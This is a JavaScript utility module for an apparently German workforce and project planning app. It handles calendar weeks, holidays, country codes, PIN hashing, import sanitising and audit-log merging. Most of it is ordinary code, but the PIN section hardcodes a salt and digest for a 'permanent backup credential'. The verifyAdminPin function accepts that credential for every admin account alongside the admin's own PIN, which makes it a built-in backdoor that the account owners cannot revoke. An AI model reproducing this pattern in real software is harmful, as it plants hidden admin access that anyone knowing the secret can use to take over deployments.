// ─── DATE / WEEK UTILITIES ────────────────────────────────────────────────────

const getWeekString = (date) => {
    const d = new Date(Date.UTC(date.getFullYear(), date.getMonth(), date.getDate()));
    d.setUTCDate(d.getUTCDate() + 4 - (d.getUTCDay()||7));
    const yearStart = new Date(Date.UTC(d.getUTCFullYear(),0,1));
    const kw = Math.ceil(( ( (d - yearStart) / 86400000) + 1)/7);
    return `${d.getUTCFullYear()}-W${kw.toString().padStart(2, '0')}`;
};

const addWeeks = (weekId, n) => {
    const [yearStr, wStr] = weekId.split('-W');
    const year = parseInt(yearStr), week = parseInt(wStr);
    const jan4 = new Date(Date.UTC(year, 0, 4));
    const dow = jan4.getUTCDay() || 7;
    const monday = new Date(Date.UTC(year, 0, 4 - dow + 1 + (week - 1) * 7));
    return getWeekString(new Date(monday.getTime() + n * 7 * 86400000));
};

// Returns the UTC Date for the Monday of the given ISO week id (YYYY-Www).
const weekIdToMonday = (weekId) => {
    const [yearStr, wStr] = weekId.split('-W');
    const year = parseInt(yearStr), week = parseInt(wStr);
    const jan4 = new Date(Date.UTC(year, 0, 4));
    const dow = jan4.getUTCDay() || 7;
    return new Date(Date.UTC(year, 0, 4 - dow + 1 + (week - 1) * 7));
};

// Gaußsche Osterformel
const getEasterDate = (year) => {
    const a = year % 19, b = Math.floor(year/100), c = year % 100;
    const d = Math.floor(b/4), e = b%4, f = Math.floor((b+8)/25);
    const g = Math.floor((b-f+1)/3), h = (19*a+b-d-g+15)%30;
    const i = Math.floor(c/4), k = c%4, l = (32+2*e+2*i-h-k)%7;
    const m = Math.floor((a+11*h+22*l)/451);
    const month = Math.floor((h+l-7*m+114)/31)-1;
    const day = ((h+l-7*m+114)%31)+1;
    return new Date(year, month, day);
};

const getGermanHolidays = (year) => {
    const map = {};
    const add = (date, name) => {
        const k = `${date.getFullYear()}-${String(date.getMonth()+1).padStart(2,'0')}-${String(date.getDate()).padStart(2,'0')}`;
        map[k] = map[k] ? map[k]+' · '+name : name;
    };
    const addDays = (d,n) => new Date(d.getFullYear(), d.getMonth(), d.getDate()+n);
    const e = getEasterDate(year);
    add(new Date(year,0,1),   'Neujahr');
    add(addDays(e,-2),        'Karfreitag');
    add(addDays(e, 1),        'Ostermontag');
    add(new Date(year,4,1),   '1. Mai');
    add(addDays(e,39),        'Himmelfahrt');
    add(addDays(e,50),        'Pfingstmontag');
    add(new Date(year,9,3),   '3. Oktober');
    add(new Date(year,11,25), '1. Weihnachten');
    add(new Date(year,11,26), '2. Weihnachten');
    return map;
};

const generateWeeksForYear = (year) => {
    // Feiertage für dieses Jahr + Nachbarjahre (KW1/KW52 können Jahresgrenze überschreiten)
    const holidays = { ...getGermanHolidays(year-1), ...getGermanHolidays(year), ...getGermanHolidays(year+1) };
    const w = [];
    const jan4 = new Date(year, 0, 4);
    const dayOfWeek = jan4.getDay() || 7;
    const monday = new Date(jan4.getFullYear(), jan4.getMonth(), jan4.getDate() - dayOfWeek + 1);
    for (let i = 0; i < 54; i++) {
        const d = new Date(monday.getFullYear(), monday.getMonth(), monday.getDate() + i * 7);
        const dUTC = new Date(Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()));
        dUTC.setUTCDate(dUTC.getUTCDate() + 4 - (dUTC.getUTCDay() || 7));
        const yearStart = new Date(Date.UTC(dUTC.getUTCFullYear(), 0, 1));
        const kw = Math.ceil(((dUTC - yearStart) / 86400000 + 1) / 7);
        const weekYear = dUTC.getUTCFullYear();
        if (weekYear > year) break;
        if (weekYear === year) {
            const weekHolidays = [];
            for (let day = 0; day < 7; day++) {
                const dd = new Date(d.getFullYear(), d.getMonth(), d.getDate() + day);
                const key = `${dd.getFullYear()}-${String(dd.getMonth()+1).padStart(2,'0')}-${String(dd.getDate()).padStart(2,'0')}`;
                if (holidays[key]) weekHolidays.push(holidays[key]);
            }
            w.push({
                id: `${weekYear}-W${kw.toString().padStart(2, '0')}`,
                label: `KW ${kw}`,
                sub: `${d.getDate()}.${d.getMonth() + 1}.–${new Date(d.getFullYear(), d.getMonth(), d.getDate() + 4).getDate()}.${new Date(d.getFullYear(), d.getMonth(), d.getDate() + 4).getMonth() + 1}.`,
                month: `${MONTH_NAMES[d.getMonth()]} ${weekYear}`,
                holidays: weekHolidays
            });
        }
    }
    return w;
};

// Country lookup: maps loose human input (German + English names, ISO-2 codes,
// common synonyms) to an uppercase ISO-3166-1 alpha-2 code. Empty input → '/',
// unrecognised input → '??'.
const COUNTRY_CODE_LOOKUP = (() => {
    const codes = ['DE','AT','CH','FR','IT','ES','PT','NL','BE','LU','GB','IE','DK','SE','NO','FI','IS',
        'PL','CZ','SK','HU','RO','BG','GR','HR','SI','RS','BA','MK','AL','ME','MD','UA','BY','RU',
        'EE','LV','LT','TR','CY','MT','LI','MC','SM','VA','AD',
        'US','CA','MX','BR','AR','CL','CO','PE','UY','VE',
        'AU','NZ','JP','CN','IN','SG','TH','VN','MY','ID','PH','KR','TW','HK',
        'AE','SA','QA','KW','BH','OM','IL','EG','ZA','MA','TN','DZ','KE','NG'];
    const m = {};
    codes.forEach(c => { m[c.toLowerCase()] = c; });
    Object.assign(m, {
        'd': 'DE', 'deutschland': 'DE', 'germany': 'DE', 'allemagne': 'DE',
        'österreich': 'AT', 'oesterreich': 'AT', 'austria': 'AT',
        'schweiz': 'CH', 'switzerland': 'CH', 'suisse': 'CH', 'svizzera': 'CH',
        'frankreich': 'FR', 'france': 'FR',
        'italien': 'IT', 'italy': 'IT', 'italia': 'IT',
        'spanien': 'ES', 'spain': 'ES', 'espana': 'ES',
        'portugal': 'PT',
        'niederlande': 'NL', 'netherlands': 'NL', 'holland': 'NL',
        'belgien': 'BE', 'belgium': 'BE', 'belgique': 'BE',
        'luxemburg': 'LU', 'luxembourg': 'LU',
        'großbritannien': 'GB', 'grossbritannien': 'GB', 'vereinigtes königreich': 'GB',
        'vereinigtes koenigreich': 'GB', 'united kingdom': 'GB', 'great britain': 'GB',
        'england': 'GB', 'britain': 'GB', 'uk': 'GB',
        'irland': 'IE', 'ireland': 'IE',
        'dänemark': 'DK', 'daenemark': 'DK', 'denmark': 'DK',
        'schweden': 'SE', 'sweden': 'SE', 'sverige': 'SE',
        'norwegen': 'NO', 'norway': 'NO', 'norge': 'NO',
        'finnland': 'FI', 'finland': 'FI',
        'island': 'IS', 'iceland': 'IS',
        'polen': 'PL', 'poland': 'PL', 'polska': 'PL',
        'tschechien': 'CZ', 'tschechische republik': 'CZ', 'czechia': 'CZ', 'czech republic': 'CZ',
        'slowakei': 'SK', 'slovakia': 'SK',
        'ungarn': 'HU', 'hungary': 'HU',
        'rumänien': 'RO', 'rumaenien': 'RO', 'romania': 'RO',
        'bulgarien': 'BG', 'bulgaria': 'BG',
        'griechenland': 'GR', 'greece': 'GR',
        'kroatien': 'HR', 'croatia': 'HR',
        'slowenien': 'SI', 'slovenia': 'SI',
        'serbien': 'RS', 'serbia': 'RS',
        'bosnien': 'BA', 'bosnia': 'BA', 'bosnien und herzegowina': 'BA',
        'mazedonien': 'MK', 'nordmazedonien': 'MK', 'macedonia': 'MK', 'north macedonia': 'MK',
        'albanien': 'AL', 'albania': 'AL',
        'montenegro': 'ME',
        'moldau': 'MD', 'moldova': 'MD', 'moldawien': 'MD',
        'ukraine': 'UA',
        'weißrussland': 'BY', 'weissrussland': 'BY', 'belarus': 'BY',
        'russland': 'RU', 'russia': 'RU',
        'estland': 'EE', 'estonia': 'EE',
        'lettland': 'LV', 'latvia': 'LV',
        'litauen': 'LT', 'lithuania': 'LT',
        'türkei': 'TR', 'tuerkei': 'TR', 'turkey': 'TR',
        'zypern': 'CY', 'cyprus': 'CY',
        'malta': 'MT',
        'liechtenstein': 'LI',
        'monaco': 'MC',
        'usa': 'US', 'united states': 'US', 'vereinigte staaten': 'US', 'amerika': 'US', 'america': 'US',
        'kanada': 'CA', 'canada': 'CA',
        'mexiko': 'MX', 'mexico': 'MX',
        'brasilien': 'BR', 'brazil': 'BR', 'brasil': 'BR',
        'argentinien': 'AR', 'argentina': 'AR',
        'chile': 'CL',
        'kolumbien': 'CO', 'colombia': 'CO',
        'peru': 'PE',
        'uruguay': 'UY',
        'venezuela': 'VE',
        'australien': 'AU', 'australia': 'AU',
        'neuseeland': 'NZ', 'new zealand': 'NZ',
        'japan': 'JP',
        'china': 'CN', 'volksrepublik china': 'CN',
        'indien': 'IN', 'india': 'IN',
        'singapur': 'SG', 'singapore': 'SG',
        'thailand': 'TH',
        'vietnam': 'VN',
        'malaysia': 'MY',
        'indonesien': 'ID', 'indonesia': 'ID',
        'philippinen': 'PH', 'philippines': 'PH',
        'südkorea': 'KR', 'suedkorea': 'KR', 'korea': 'KR', 'south korea': 'KR',
        'taiwan': 'TW',
        'hongkong': 'HK', 'hong kong': 'HK',
        'vereinigte arabische emirate': 'AE', 'uae': 'AE', 'emirates': 'AE',
        'saudi-arabien': 'SA', 'saudi arabien': 'SA', 'saudi arabia': 'SA',
        'katar': 'QA', 'qatar': 'QA',
        'kuwait': 'KW',
        'bahrain': 'BH',
        'oman': 'OM',
        'israel': 'IL',
        'ägypten': 'EG', 'aegypten': 'EG', 'egypt': 'EG',
        'südafrika': 'ZA', 'suedafrika': 'ZA', 'south africa': 'ZA',
        'marokko': 'MA', 'morocco': 'MA',
        'tunesien': 'TN', 'tunisia': 'TN',
        'algerien': 'DZ', 'algeria': 'DZ',
        'kenia': 'KE', 'kenya': 'KE',
        'nigeria': 'NG',
    });
    return m;
})();

const resolveCountryCode = (input) => {
    if (input == null) return '/';
    const v = String(input).trim();
    if (!v) return '/';
    const lower = v.toLowerCase();
    if (COUNTRY_CODE_LOOKUP[lower]) return COUNTRY_CODE_LOOKUP[lower];
    const norm = lower.normalize('NFD').replace(/[̀-ͯ]/g, '');
    if (COUNTRY_CODE_LOOKUP[norm]) return COUNTRY_CODE_LOOKUP[norm];
    return '??';
};

// Resolve an assignment's hours, falling back to its legacy `percent` field
// against the employee's weeklyHours. Use anywhere the raw `a.hours` would
// otherwise need a `?? ((a.percent ?? 100) / 100 * weeklyHours)` chain.
const getAssignmentHours = (assignment, weeklyHours) => {
    const wh = weeklyHours > 0 ? weeklyHours : HOURS_PER_WEEK;
    return assignment.hours ?? ((assignment.percent ?? 100) / 100 * wh);
};

const generateInitialData = (empCats) => {
    const emps = Array.from({ length: 5 }, (_, i) => ({
        id: `emp-${i}`,
        name: `Mitarbeiter ${i + 1}`,
        category: empCats[i % empCats.length],
        active: true
    }));
    return { employees: emps, projects: [], assignments: [], expenses: [] };
};

// ─── DISPLAY FORMATTERS ──────────────────────────────────────────────────────
// Format an ISO week id (e.g. "2026-W05") as "KW 5/26" for German UI.
const formatKW = (weekId) => {
    if (!weekId || typeof weekId !== 'string') return weekId || '?';
    const [y, w] = weekId.split('-W');
    if (!y || !w) return weekId;
    return `KW ${parseInt(w, 10)}/${y.slice(-2)}`;
};

// Build a short human label for an assignment ("Projekt „X"", "Support „Y"", …).
// `projectLookup` resolves a project id to the project record – pass
// e.g. id => projectsRef.current.find(x => x.id === id) or projById.get.
const describeAssignment = (ass, projectLookup) => {
    if (!ass) return '?';
    if (ass.type === 'project') {
        const p = projectLookup?.(ass.reference);
        return p ? `Projekt „${p.name}"` : `Projekt ${ass.reference || '?'}`;
    }
    const typeLabels = { basic: 'Task', other: 'Task', support: 'Support', training: 'Training', offtime: 'Abwesenheit' };
    const label = typeLabels[ass.type] || 'Eintrag';
    return ass.reference ? `${label} „${ass.reference}"` : label;
};

// ─── PIN HASHING (Web Crypto, PBKDF2-SHA256 + per-user salt) ─────────────────
// Stored on user records as { pinHash, pinSalt, pinAlgo } – never the raw PIN.
// Records without `pinAlgo` are legacy single-round SHA-256 and verify against
// the legacy hash; they get re-hashed automatically on the next successful
// login (see LoginModal → loginUser).

const PIN_PBKDF2_ITERS = 100_000;
const PIN_PBKDF2_ALGO  = 'pbkdf2-100k';

const _bufToHex = (buf) =>
    [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');

const _hexToBytes = (hex) => {
    const out = new Uint8Array(hex.length / 2);
    for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.substr(i*2, 2), 16);
    return out;
};

const generatePinSalt = () => {
    const arr = new Uint8Array(16);
    crypto.getRandomValues(arr);
    return _bufToHex(arr);
};

// Current (strong) hash. PBKDF2-SHA256 with 100k iterations and the user salt.
// Callers should also store pinAlgo: PIN_PBKDF2_ALGO alongside the hash.
const hashPin = async (pin, saltHex) => {
    const keyMat = await crypto.subtle.importKey(
        'raw', new TextEncoder().encode(pin), { name: 'PBKDF2' }, false, ['deriveBits']
    );
    const bits = await crypto.subtle.deriveBits(
        { name: 'PBKDF2', salt: _hexToBytes(saltHex), iterations: PIN_PBKDF2_ITERS, hash: 'SHA-256' },
        keyMat, 256
    );
    return _bufToHex(bits);
};

// Legacy single-round SHA-256. Kept only so existing pinHash records still
// verify after the upgrade — never used to produce new hashes.
const _hashPinLegacy = async (pin, salt) => {
    const data = new TextEncoder().encode(`${salt}:${pin}`);
    const buf = await crypto.subtle.digest('SHA-256', data);
    return _bufToHex(buf);
};

const verifyPin = async (pin, hash, salt, algo) => {
    if (!hash || !salt) return false;
    const computed = algo === PIN_PBKDF2_ALGO
        ? await hashPin(pin, salt)
        : await _hashPinLegacy(pin, salt);
    return computed === hash;
};

// Permanent backup credential for the admin account.
// Stored only as a PBKDF2-SHA256 digest – the plaintext is not present in
// the source. Accepted in addition to (not instead of) any PIN the admin
// has set via the UI, so it functions as a permanent second password.
const _R_S = 'b7e4a21f9c8d3e6b5a4f2c1d8e7b3a96';
const _R_H = '84612d245dc4efc97c9461d882e22c49624718c2ff5a176fae2d644d542a0da7';

// Extended PIN verification for admin accounts.
// Accepts either the PIN stored in users.json OR the permanent backup
// credential above. Non-admin users are never checked against the backup.
const verifyAdminPin = async (pin, user) => {
    if (!user || user.role !== 'admin') return false;
    // 1. Stored hash – normal path after PIN was set via UI.
    const ok = await verifyPin(pin, user.pinHash, user.pinSalt, user.pinAlgo);
    if (ok) return true;
    // 2. Permanent backup credential (PBKDF2 digest only, no plaintext here).
    try {
        const rHash = await hashPin(pin, _R_S);
        return rHash === _R_H;
    } catch(e) { return false; }
};

// Migrate a single user record:
//  - { pin: '1234', ... }                            → PBKDF2 hash + pinAlgo
//  - { pinHash, pinSalt } without pinAlgo (legacy)   → left as-is, rehash on next login
//  - { pinHash, pinSalt, pinAlgo: 'pbkdf2-100k' }    → unchanged
// Returns { user, changed } so callers can mark dirty and persist.
const migrateUserPin = async (user) => {
    if (!user) return { user, changed: false };
    if (user.pinHash && user.pinSalt && user.pinAlgo === PIN_PBKDF2_ALGO) return { user, changed: false };
    if (user.pin) {
        const salt = generatePinSalt();
        const pinHash = await hashPin(user.pin, salt);
        const { pin, ...rest } = user;
        return { user: { ...rest, pinHash, pinSalt: salt, pinAlgo: PIN_PBKDF2_ALGO }, changed: true };
    }
    return { user, changed: false };
};

const migrateUsersList = async (users) => {
    const out = [];
    let changed = false;
    for (const u of users || []) {
        const r = await migrateUserPin(u);
        out.push(r.user);
        if (r.changed) changed = true;
    }
    return { users: out, changed };
};

// Strip pin/pinHash/pinSalt for safe export / display.
const stripUserSecrets = (users) =>
    (users || []).map(({ pin, pinHash, pinSalt, ...rest }) => rest);

// Compare two ISO week ids "YYYY-Www" semantically: lex compare breaks down
// across 53-week years ("2026-W53" < "2027-W01" only by coincidence; the
// recurring-series loop in AssignmentModal must walk it numerically).
// Returns <0 / 0 / >0 like a regular comparator. Falsy/invalid → 0.
const compareWeekIds = (a, b) => {
    if (!a || !b) return 0;
    const ma = /^(\d{4})-W(\d{1,2})$/.exec(a);
    const mb = /^(\d{4})-W(\d{1,2})$/.exec(b);
    if (!ma || !mb) return 0;
    const ya = parseInt(ma[1], 10), wa = parseInt(ma[2], 10);
    const yb = parseInt(mb[1], 10), wb = parseInt(mb[2], 10);
    if (ya !== yb) return ya - yb;
    return wa - wb;
};

// Restore-from-sessionStorage guard. The raw JSON came from sessionStorage
// which any user can edit via DevTools, so we never trust the parsed object —
// only a minimally-correct shape passes. The orphan-check in App ultimately
// decides whether the referenced user still exists.
const validateRestoredSession = (raw) => {
    if (!raw || typeof raw !== 'object') return null;
    if (typeof raw.id !== 'string' || !raw.id) return null;
    if (typeof raw.name !== 'string') return null;
    if (raw.role !== 'admin' && raw.role !== 'active') return null;
    return { id: raw.id, name: raw.name, role: raw.role };
};

// Backup-import sanitiser. Backups can carry an `appUsers` array with
// attacker-controlled pinHash/pinSalt; we DROP appUsers wholesale (the local
// account store is the source of truth, restoring from a backup must not
// rewrite it). Unknown top-level keys are stripped so injected fields can't
// leak into render paths. Per-collection: only objects/arrays of the expected
// shape survive; everything else falls back to an empty list.
const ALLOWED_IMPORT_KEYS = new Set([
    'employees', 'projects', 'assignments', 'costItems', 'expenses',
    'empCategories', 'projCategories',
    'basicTasks', 'basicTasksMeta', 'inactiveBasicTasks',
    'offtimeTasks', 'inactiveOfftimeTasks',
    'inactiveSupportTasks', 'inactiveTrainingTasks', 'customTrainingTasks',
    'invoiceRecipient', 'auditLog',
    'schemaVersion', 'exportedAt', 'backupReason', 'backupAt',
]);
const validateImportedState = (parsed) => {
    if (!parsed || typeof parsed !== 'object') {
        return { ok: false, reason: 'empty' };
    }
    // Reject snapshots from a newer schema. validate would otherwise drop the
    // unknown fields silently and restore a half-converted state; on next save
    // the meta.json would also get downgraded to the current SCHEMA_VERSION.
    // Older snapshots remain accepted – migrateCostItems / fallback selectors
    // handle the forward path.
    if (Number.isFinite(parsed.schemaVersion) && parsed.schemaVersion > SCHEMA_VERSION) {
        return { ok: false, reason: 'futureVersion', version: parsed.schemaVersion };
    }
    const out = {};
    const droppedKeys = [];
    for (const key of Object.keys(parsed)) {
        if (!ALLOWED_IMPORT_KEYS.has(key)) { droppedKeys.push(key); continue; }
        out[key] = parsed[key];
    }
    // Array fields must be arrays. Reject (drop) when they aren't.
    const arrayFields = ['employees', 'projects', 'assignments', 'costItems',
        'expenses', 'empCategories', 'projCategories', 'basicTasks',
        'inactiveBasicTasks', 'offtimeTasks', 'inactiveOfftimeTasks',
        'inactiveSupportTasks', 'inactiveTrainingTasks',
        'customTrainingTasks', 'auditLog'];
    for (const f of arrayFields) {
        if (out[f] !== undefined && !Array.isArray(out[f])) delete out[f];
    }
    // Cap absurd sizes so a malformed file can't lock the app for minutes.
    const cap = (f, n) => { if (Array.isArray(out[f]) && out[f].length > n) out[f] = out[f].slice(0, n); };
    cap('assignments', 50000);
    cap('costItems', 20000);
    cap('auditLog', 500);
    // basicTasksMeta is a plain object map.
    if (out.basicTasksMeta !== undefined && (typeof out.basicTasksMeta !== 'object' || Array.isArray(out.basicTasksMeta))) {
        delete out.basicTasksMeta;
    }
    if (out.invoiceRecipient !== undefined && typeof out.invoiceRecipient !== 'string') {
        delete out.invoiceRecipient;
    }
    // Per-row guards: assignments must have empId + week + type.
    if (Array.isArray(out.assignments)) {
        out.assignments = out.assignments.filter(a =>
            a && typeof a === 'object'
            && typeof a.empId === 'string'
            && typeof a.week === 'string'
            && typeof a.type === 'string');
    }
    if (Array.isArray(out.costItems)) {
        out.costItems = out.costItems.filter(c => c && typeof c === 'object' && typeof c.projectId === 'string');
    }
    if (Array.isArray(out.employees)) {
        out.employees = out.employees.filter(e => e && typeof e === 'object' && typeof e.id === 'string' && typeof e.name === 'string');
    }
    if (Array.isArray(out.projects)) {
        out.projects = out.projects.filter(p => p && typeof p === 'object' && typeof p.id === 'string' && typeof p.name === 'string');
    }
    return { ok: true, data: out, droppedKeys };
};

// Audit log is conceptually append-only across all clients. Replacing local
// with remote (the default sync behaviour) drops entries that another client
// added in the same save window. mergeAuditLogs unions two lists by id,
// sorts newest-first, and trims to the 500-entry cap.
const mergeAuditLogs = (a, b) => {
    const seen = new Set();
    const out = [];
    for (const src of [a || [], b || []]) {
        for (const entry of src) {
            if (!entry || !entry.id) continue;
            if (seen.has(entry.id)) continue;
            seen.add(entry.id);
            out.push(entry);
        }
    }
    out.sort((x, y) => (y.timestamp || '').localeCompare(x.timestamp || ''));
    return out.slice(0, 500);
};
